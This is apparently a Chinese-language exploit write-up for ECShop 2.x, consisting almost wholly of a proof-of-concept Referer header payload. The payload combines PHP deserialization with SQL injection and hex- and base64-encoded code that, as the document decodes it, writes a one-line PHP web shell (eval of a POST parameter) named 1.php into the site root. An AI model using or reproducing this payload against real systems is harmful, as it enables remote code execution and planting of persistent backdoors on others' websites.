
## Affected Version  

**ecshop2.x**

## POC 

**Referer处。**


### 代码执行

    Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";}

 在网站根目录下生成1.php的一句话。

    assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp'));//}xxx
    file_put_contents('1.php','<?php eval($_POST[1337]); ?>')




